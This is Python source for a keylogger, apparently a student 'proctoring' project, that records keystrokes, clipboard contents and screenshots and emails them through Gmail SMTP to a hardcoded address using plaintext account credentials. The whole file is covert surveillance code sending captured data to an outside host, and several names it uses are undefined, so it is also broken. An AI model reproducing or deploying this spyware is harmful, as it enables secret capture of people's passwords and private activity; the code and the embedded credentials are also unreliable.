from pynput.keyboard import Key, Listener

import time
import os

import getpass
from requests import get

import win32clipboard
import time
import os

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib


log_file = "key_log.txt"
clipboard_file = "clipboard.txt"
screenshots_file = "screenshot.png"

# SENDER 
emailaddr = "proctoringsys66@gmail.com"  
pwd = "proctor@66151"

username = getpass.getuser()

# RECEIVER
toaddr = "justforproj66151@gmail.com"

filepath = "C:\\Users\\sharm\\OneDrive\\Desktop\\Student Proctoring System\\Keylogging"
extend = "\\"
mergefile = filepath + extend

def fwd_email(filename, attachment, toaddr):

    sender_addr = emailaddr

    msg = MIMEMultipart()   # MIMEMultipart instance
    
    # Storing senders & receivers email address
    msg['From'] = sender_addr
    msg['To'] = toaddr
    
    #storing subject of email
    msg['Subject'] = "Log File"
    
    body = "Mail Body"
    
    msg.attach(MIMEText(body, 'plain')) #attaching msg body with msg instance

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    #changing payload into encoded form
    p.set_payload((attachment).read())

    #encoding into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)  # attaching instance 'p' to instance msg

    s = smtplib.SMTP('smtp.gmail.com', 587)  # creating SMTP session

    s.starttls()  #starting TLS for security

    s.login(sender_addr, pwd)  # Authentication

    text = msg.as_string()  # converting multipart msg into a string

    s.sendmail(fromaddr, toaddr, text)   # sending mail

    s.quit()

fwd_email(log_file, filepath + extend + log_file, toaddr)

# get the clipboard contents
def copy_clipboard():
    with open(filepath + extend + clipboard_file, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

def screenshot():
    im = ImageGrab.grab()
    im.save(filepath + extend + screenshots_file)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(filepath + extend + log_file, "w") as f:
            f.write(" ")

        screenshot()
        fwd_email(screenshots_file, filepath + extend + screenshots_file, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration



    

    

    




